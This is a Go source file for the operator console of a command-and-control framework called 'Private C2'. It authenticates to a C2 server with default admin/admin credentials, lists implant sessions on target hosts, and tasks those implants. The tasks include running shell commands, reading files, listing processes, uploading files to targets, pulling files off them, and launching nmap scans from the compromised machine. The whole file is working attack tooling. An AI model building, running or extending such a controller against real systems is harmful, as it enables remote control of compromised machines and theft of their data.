package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/azizbinmohammad/private-c2/client/api"
)

// ANSI color helpers
const (
	colorReset  = "\033[0m"
	colorRed    = "\033[31m"
	colorGreen  = "\033[32m"
	colorYellow = "\033[33m"
	colorCyan   = "\033[36m"
	colorBold   = "\033[1m"
	colorDim    = "\033[2m"
)

// Session represents a remote implant session.
type Session struct {
	ID          string `json:"id"`
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	RemoteAddr  string `json:"remote_addr"`
	LastCheckin string `json:"last_checkin"`
	CreatedAt   string `json:"created_at"`
}

// TaskRequest is the body sent to create a new task. The server forwards only
// type and args to the implant, so bulk payloads (uploads) ride inside Args.
type TaskRequest struct {
	Type string `json:"type"`
	Args string `json:"args,omitempty"`
}

// TaskResponse is the response from creating a task.
type TaskResponse struct {
	TaskID string `json:"task_id"`
}

// TaskResult is the response from polling a task.
type TaskResult struct {
	TaskID  string `json:"task_id"`
	Status  string `json:"status"`
	Success bool   `json:"success"`
	Output  string `json:"output"`
	Error   string `json:"error"`
}

func main() {
	serverAddr := flag.String("server", "http://127.0.0.1:8080", "Server HTTP API address")
	username := flag.String("username", "admin", "Operator username")
	password := flag.String("password", "admin", "Operator password")
	attach := flag.String("session", "", "session ID prefix to attach to on startup (optional)")
	flag.Parse()

	printBanner()

	client := api.New(*serverAddr)
	if err := client.Login(*username, *password); err != nil {
		printError(fmt.Sprintf("Authentication failed: %v", err))
		printInfo("Check --server, --username and --password.")
		os.Exit(1)
	}
	printSuccess(fmt.Sprintf("Authenticated to %s as %s", client.BaseURL(), *username))

	var activeSession *Session
	// --session lets a launcher drop the operator straight into the implant it
	// just started, instead of making them read an ID off another log and type
	// it back in. cmdUse reports its own errors, so an unknown or ambiguous
	// prefix just leaves the console unattached rather than failing startup.
	if *attach != "" {
		activeSession = cmdUse(client, *attach)
	}

	scanner := bufio.NewScanner(os.Stdin)
	// Increase scanner buffer for large outputs
	scanner.Buffer(make([]byte, 0, 1024*1024), 1024*1024)

	for {
		printPrompt(activeSession)

		if !scanner.Scan() {
			// EOF (Ctrl+D)
			fmt.Println()
			printInfo("Goodbye.")
			break
		}

		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		parts := splitArgs(line)
		cmd := strings.ToLower(parts[0])
		args := parts[1:]

		switch cmd {
		case "exit", "quit":
			printInfo("Goodbye.")
			return

		case "help":
			printHelp()

		case "sessions":
			cmdSessions(client)

		case "ls":
			// "ls" with no active session lists sessions; with active session sends ls task
			if activeSession == nil {
				if len(args) == 0 {
					cmdSessions(client)
				} else {
					printError("No active session. Use 'use <id>' first.")
				}
			} else {
				path := "."
				if len(args) > 0 {
					path = strings.Join(args, " ")
				}
				cmdTask(client, activeSession.ID, "ls", path)
			}

		case "use", "interact":
			if len(args) < 1 {
				printError("Usage: use <session-id-prefix>")
				continue
			}
			activeSession = cmdUse(client, args[0])

		case "info":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			cmdInfo(client, activeSession.ID)

		case "shell":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: shell <command>")
				continue
			}
			cmdTask(client, activeSession.ID, "shell", strings.Join(args, " "))

		case "!":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: ! <command>")
				continue
			}
			cmdTask(client, activeSession.ID, "shell", strings.Join(args, " "))

		case "pwd":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			cmdTask(client, activeSession.ID, "pwd", "")

		case "cd":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: cd <path>")
				continue
			}
			cmdTask(client, activeSession.ID, "cd", strings.Join(args, " "))

		case "ps":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			cmdTask(client, activeSession.ID, "ps", "")

		case "cat":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: cat <file>")
				continue
			}
			cmdTask(client, activeSession.ID, "cat", strings.Join(args, " "))

		case "upload":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 2 {
				printError("Usage: upload <local-path> <remote-path>")
				continue
			}
			cmdUpload(client, activeSession.ID, args[0], args[1])

		case "download":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: download <remote-path> [local-path]")
				continue
			}
			localPath := ""
			if len(args) >= 2 {
				localPath = args[1]
			}
			cmdDownload(client, activeSession.ID, args[0], localPath)

		case "nmap":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			// Unlike the commands above, no arguments is meaningful: it asks the
			// target whether nmap is installed there.
			cmdTask(client, activeSession.ID, "nmap", strings.Join(args, " "))

		case "back":
			if activeSession != nil {
				printInfo("Session deselected.")
				activeSession = nil
			} else {
				printWarning("No active session.")
			}

		default:
			// Handle "! cmd" when typed as "!cmd" (no space)
			if strings.HasPrefix(cmd, "!") && len(cmd) > 1 {
				if activeSession == nil {
					printError("No active session. Use 'use <id>' first.")
					continue
				}
				fullCmd := cmd[1:] + " " + strings.Join(args, " ")
				cmdTask(client, activeSession.ID, "shell", strings.TrimSpace(fullCmd))
			} else {
				printError(fmt.Sprintf("Unknown command: %s. Type 'help' for available commands.", cmd))
			}
		}
	}
}

// splitArgs splits a command line into arguments, respecting quoted strings.
func splitArgs(line string) []string {
	var args []string
	var current strings.Builder
	inQuote := false
	quoteChar := byte(0)

	for i := 0; i < len(line); i++ {
		c := line[i]
		if inQuote {
			if c == quoteChar {
				inQuote = false
			} else {
				current.WriteByte(c)
			}
		} else {
			if c == '"' || c == '\'' {
				inQuote = true
				quoteChar = c
			} else if c == ' ' || c == '\t' {
				if current.Len() > 0 {
					args = append(args, current.String())
					current.Reset()
				}
			} else {
				current.WriteByte(c)
			}
		}
	}
	if current.Len() > 0 {
		args = append(args, current.String())
	}
	return args
}

func printBanner() {
	fmt.Printf(`
%s%s  ____       _            _            ____ ____  %s
%s%s |  _ \ _ __(_)_   ____ _| |_ ___     / ___|___ \ %s
%s%s | |_) | '__| \ \ / / _  | __/ _ \   | |     __) |%s
%s%s |  __/| |  | |\ V / (_| | ||  __/   | |___ / __/ %s
%s%s |_|   |_|  |_| \_/ \__,_|\__\___|    \____|_____|%s
`,
		colorBold, colorCyan, colorReset,
		colorBold, colorCyan, colorReset,
		colorBold, colorCyan, colorReset,
		colorBold, colorCyan, colorReset,
		colorBold, colorCyan, colorReset,
	)
	fmt.Printf("  %sPrivate C2 Framework — Operator Console%s\n", colorDim, colorReset)
	fmt.Printf("  %sType 'help' for available commands.%s\n\n", colorDim, colorReset)
}

func printPrompt(session *Session) {
	if session != nil {
		short := session.ID
		if len(short) > 8 {
			short = short[:8]
		}
		fmt.Printf("%s%spc2%s [%s%s%s] > ", colorBold, colorCyan, colorReset, colorYellow, short, colorReset)
	} else {
		fmt.Printf("%s%spc2%s > ", colorBold, colorCyan, colorReset)
	}
}

func printError(msg string) {
	fmt.Printf("%s[!] %s%s\n", colorRed, msg, colorReset)
}

func printSuccess(msg string) {
	fmt.Printf("%s[+] %s%s\n", colorGreen, msg, colorReset)
}

func printInfo(msg string) {
	fmt.Printf("%s[*] %s%s\n", colorCyan, msg, colorReset)
}

func printWarning(msg string) {
	fmt.Printf("%s[!] %s%s\n", colorYellow, msg, colorReset)
}

func printHelp() {
	fmt.Printf("\n%s%sAvailable Commands:%s\n\n", colorBold, colorCyan, colorReset)
	helpEntries := []struct{ cmd, desc string }{
		{"sessions, ls", "List all active sessions"},
		{"use <id>", "Select a session by ID prefix (min 4 chars)"},
		{"interact <id>", "Alias for 'use'"},
		{"info", "Show full details of the active session"},
		{"back", "Deselect the active session"},
		{"", ""},
		{"shell <cmd>", "Execute a shell command on the target"},
		{"! <cmd>", "Shorthand for 'shell <cmd>'"},
		{"ls [path]", "List directory contents (with active session)"},
		{"pwd", "Print working directory on target"},
		{"cd <path>", "Change directory on target"},
		{"ps", "List running processes on target"},
		{"cat <file>", "Read file contents on target"},
		{"upload <local> <remote>", "Upload a local file to the target"},
		{"download <remote> [local]", "Download a file from the target"},
		{"nmap [target] [opts]", "Run nmap on the target (no args = check nmap is installed)"},
		{"", ""},
		{"help", "Show this help message"},
		{"exit, quit", "Exit the console"},
	}
	for _, e := range helpEntries {
		if e.cmd == "" {
			fmt.Println()
			continue
		}
		fmt.Printf("  %s%-28s%s %s\n", colorGreen, e.cmd, colorReset, e.desc)
	}
	fmt.Println()
}

// relativeTime returns a human-friendly relative time string.
func relativeTime(ts string) string {
	t, err := time.Parse(time.RFC3339, ts)
	if err != nil {
		// Try RFC3339Nano
		t, err = time.Parse(time.RFC3339Nano, ts)
		if err != nil {
			return ts
		}
	}
	d := time.Since(t)
	if d < 0 {
		return "just now"
	}
	switch {
	case d < time.Minute:
		s := int(d.Seconds())
		if s <= 1 {
			return "1s ago"
		}
		return fmt.Sprintf("%ds ago", s)
	case d < time.Hour:
		m := int(d.Minutes())
		if m == 1 {
			return "1m ago"
		}
		return fmt.Sprintf("%dm ago", m)
	case d < 24*time.Hour:
		h := int(d.Hours())
		if h == 1 {
			return "1h ago"
		}
		return fmt.Sprintf("%dh ago", h)
	default:
		days := int(d.Hours() / 24)
		if days == 1 {
			return "1d ago"
		}
		return fmt.Sprintf("%dd ago", days)
	}
}

// cmdSessions fetches and displays all sessions.
func cmdSessions(client *api.Client) {
	var sessions []Session
	if err := client.Get("/api/sessions", &sessions); err != nil {
		printError(fmt.Sprintf("Failed to list sessions: %v", err))
		return
	}

	if len(sessions) == 0 {
		printWarning("No active sessions.")
		return
	}

	// Table header
	fmt.Printf("\n%s%-10s %-14s %-10s %-12s %-22s %-12s%s\n",
		colorCyan,
		"ID", "Hostname", "User", "OS/Arch", "Remote Addr", "Last Seen",
		colorReset,
	)
	fmt.Printf("%s%s%s\n", colorDim, strings.Repeat("-", 82), colorReset)

	for _, s := range sessions {
		shortID := s.ID
		if len(shortID) > 8 {
			shortID = shortID[:8]
		}
		osArch := s.OS + "/" + s.Arch
		fmt.Printf("%-10s %-14s %-10s %-12s %-22s %-12s\n",
			shortID, truncate(s.Hostname, 14), truncate(s.Username, 10),
			truncate(osArch, 12), truncate(s.RemoteAddr, 22),
			relativeTime(s.LastCheckin),
		)
	}
	fmt.Println()
}

// truncate shortens a string to maxLen, appending "..." if needed.
func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	if maxLen <= 3 {
		return s[:maxLen]
	}
	return s[:maxLen-3] + "..."
}

// cmdUse selects a session by ID prefix.
func cmdUse(client *api.Client, prefix string) *Session {
	if len(prefix) < 4 {
		printError("Session ID prefix must be at least 4 characters.")
		return nil
	}

	var sessions []Session
	if err := client.Get("/api/sessions", &sessions); err != nil {
		printError(fmt.Sprintf("Failed to list sessions: %v", err))
		return nil
	}

	prefix = strings.ToLower(prefix)
	var matches []Session
	for _, s := range sessions {
		if strings.HasPrefix(strings.ToLower(s.ID), prefix) {
			matches = append(matches, s)
		}
	}

	switch len(matches) {
	case 0:
		printError(fmt.Sprintf("No session matching prefix '%s'.", prefix))
		return nil
	case 1:
		s := &matches[0]
		short := s.ID
		if len(short) > 8 {
			short = short[:8]
		}
		printSuccess(fmt.Sprintf("Active session: %s (%s@%s)", short, s.Username, s.Hostname))
		return s
	default:
		printError(fmt.Sprintf("Ambiguous prefix '%s' matches %d sessions. Be more specific.", prefix, len(matches)))
		for _, s := range matches {
			short := s.ID
			if len(short) > 8 {
				short = short[:8]
			}
			fmt.Printf("  %s %s@%s\n", short, s.Username, s.Hostname)
		}
		return nil
	}
}

// cmdInfo displays detailed information about the active session.
func cmdInfo(client *api.Client, sessionID string) {
	var s Session
	if err := client.Get("/api/sessions/"+sessionID, &s); err != nil {
		printError(fmt.Sprintf("Failed to get session info: %v", err))
		return
	}

	fmt.Printf("\n%s%sSession Details%s\n", colorBold, colorCyan, colorReset)
	fmt.Printf("%s%s%s\n", colorDim, strings.Repeat("-", 40), colorReset)
	fmt.Printf("  %sID:%s          %s\n", colorCyan, colorReset, s.ID)
	fmt.Printf("  %sHostname:%s    %s\n", colorCyan, colorReset, s.Hostname)
	fmt.Printf("  %sUsername:%s    %s\n", colorCyan, colorReset, s.Username)
	fmt.Printf("  %sOS:%s          %s\n", colorCyan, colorReset, s.OS)
	fmt.Printf("  %sArch:%s        %s\n", colorCyan, colorReset, s.Arch)
	fmt.Printf("  %sRemote Addr:%s %s\n", colorCyan, colorReset, s.RemoteAddr)
	fmt.Printf("  %sLast Checkin:%s %s (%s)\n", colorCyan, colorReset, s.LastCheckin, relativeTime(s.LastCheckin))
	fmt.Printf("  %sCreated:%s     %s\n", colorCyan, colorReset, s.CreatedAt)
	fmt.Println()
}

// taskPollInterval is how often cmdTask/cmdDownload check for a finished task.
const taskPollInterval = 500 * time.Millisecond

// taskPollTimeout bounds how long the console waits for a task result.
const taskPollTimeout = 30 * time.Second

// nmapPollTimeout bounds the wait for a scan, which takes far longer than the
// other tasks. It has to outlast the implant's own nmap timeout
// (implant/modules/nmap.DefaultTimeout) plus a beacon interval on either side --
// the scan runs inline in the implant's beacon loop, so the result only comes
// back on the checkin after it finishes.
const nmapPollTimeout = 5 * time.Minute

// taskPollTimeoutFor returns how long to wait for a task of the given type.
// Only scans get the long window; every other task keeps the short one.
func taskPollTimeoutFor(taskType string) time.Duration {
	if taskType == "nmap" {
		return nmapPollTimeout
	}
	return taskPollTimeout
}

// isTaskPending reports whether a task result represents an unfinished task.
//
// The server answers GET /api/tasks/{id} with {"status":"pending"} while the
// task is still queued, and with the bare result object (no "status" field)
// once it has completed. The web portal relies on the same contract (see
// pollResult() in webui/index.html), so this must stay a "not pending means
// done" test rather than looking for an explicit "completed" status.
func isTaskPending(result *TaskResult) bool {
	return result.Status == "pending"
}

// cmdTask submits a task and polls until completion.
func cmdTask(client *api.Client, sessionID string, taskType string, taskArgs string) {
	req := TaskRequest{
		Type: taskType,
		Args: taskArgs,
	}

	var resp TaskResponse
	if err := client.Post("/api/sessions/"+sessionID+"/task", req, &resp); err != nil {
		printError(fmt.Sprintf("Failed to submit task: %v", err))
		return
	}

	printInfo(fmt.Sprintf("Task submitted: %s", resp.TaskID))

	result, ok := pollTask(client, resp.TaskID, taskPollTimeoutFor(taskType))
	if !ok {
		return
	}
	renderTaskResult(result)
}

// pollTask polls /api/tasks/{id} until the task finishes or the timeout
// elapses. It returns ok=false when the caller should not render a result.
func pollTask(client *api.Client, taskID string, timeout time.Duration) (*TaskResult, bool) {
	deadline := time.After(timeout)
	ticker := time.NewTicker(taskPollInterval)
	defer ticker.Stop()

	for {
		select {
		case <-deadline:
			printWarning(fmt.Sprintf("Task timed out after %s. It may still be running on the target.", timeout))
			printInfo(fmt.Sprintf("Check later with task ID: %s", taskID))
			return nil, false
		case <-ticker.C:
			var result TaskResult
			if err := client.Get("/api/tasks/"+taskID, &result); err != nil {
				printError(fmt.Sprintf("Failed to poll task: %v", err))
				return nil, false
			}
			if isTaskPending(&result) {
				continue
			}
			return &result, true
		}
	}
}

// renderTaskResult prints a finished task's outcome for the plain commands.
//
// Output is printed before the failure is reported, not after an early return:
// a task that errors can still have produced useful output, and dropping it
// loses the most valuable part of the result. A scan that hits the implant's
// timeout is the clearest case -- the ports it found are in that output.
func renderTaskResult(result *TaskResult) {
	if result.Output != "" {
		fmt.Print(result.Output)
		if !strings.HasSuffix(result.Output, "\n") {
			fmt.Println()
		}
	}
	if !result.Success {
		printError(fmt.Sprintf("Task failed: %s", result.Error))
		return
	}
	if result.Output == "" {
		printSuccess("Task completed (no output).")
	}
}

// cmdUpload reads a local file and uploads it to the target.
//
// The implant's upload handler expects the wire args to be
// "<base64-data>|<remote-path>" (see the "upload" case in cmd/implant/main.go).
// The base64 payload must travel inside Args: the API's TaskRequest carries
// only type and args, so a separate field would be silently dropped.
func cmdUpload(client *api.Client, sessionID string, localPath string, remotePath string) {
	data, err := os.ReadFile(localPath)
	if err != nil {
		printError(fmt.Sprintf("Failed to read local file: %v", err))
		return
	}

	printInfo(fmt.Sprintf("Uploading %s (%d bytes) -> %s", localPath, len(data), remotePath))

	cmdTask(client, sessionID, "upload", uploadTaskArgs(remotePath, data))
}

// uploadTaskArgs builds the wire args for an upload task. It must match the
// "base64data|remote-path" format the implant parses, or the target receives an
// empty payload.
func uploadTaskArgs(remotePath string, data []byte) string {
	return base64.StdEncoding.EncodeToString(data) + "|" + remotePath
}

// cmdDownload downloads a file from the target and saves it locally.
func cmdDownload(client *api.Client, sessionID string, remotePath string, localPath string) {
	if localPath == "" {
		localPath = filepath.Base(remotePath)
	}

	req := TaskRequest{
		Type: "download",
		Args: remotePath,
	}

	var resp TaskResponse
	if err := client.Post("/api/sessions/"+sessionID+"/task", req, &resp); err != nil {
		printError(fmt.Sprintf("Failed to submit download task: %v", err))
		return
	}

	printInfo(fmt.Sprintf("Downloading %s -> %s", remotePath, localPath))

	result, ok := pollTask(client, resp.TaskID, taskPollTimeout)
	if !ok {
		return
	}
	if !result.Success {
		printError(fmt.Sprintf("Download failed: %s", result.Error))
		return
	}

	decoded, err := base64.StdEncoding.DecodeString(result.Output)
	if err != nil {
		printError(fmt.Sprintf("Failed to decode file data: %v", err))
		return
	}

	if err := os.WriteFile(localPath, decoded, 0644); err != nil {
		printError(fmt.Sprintf("Failed to write local file: %v", err))
		return
	}

	printSuccess(fmt.Sprintf("Downloaded %d bytes to %s", len(decoded), localPath))
}
